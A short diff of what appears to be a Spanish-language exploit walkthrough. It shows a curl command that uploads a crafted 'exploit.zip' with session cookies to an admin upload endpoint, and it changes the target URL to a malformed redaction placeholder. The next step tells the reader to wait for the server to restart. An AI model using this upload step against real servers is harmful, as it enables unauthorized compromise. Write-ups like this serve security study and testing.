@@ -163,7 +163,7 @@ with zipfile.ZipFile(zip_buffer, "w") as zf:
 ```bash
 curl -b cookies.txt \
   -F "files=@exploit.zip" \
-  "http://TARGET/admin/recipients/clarion/upload"
+  "http:SECRET_REDACTED_BY_ANTIGRAVITY"
 ```
 
 ### Paso 5: Esperar reinicio del servidor
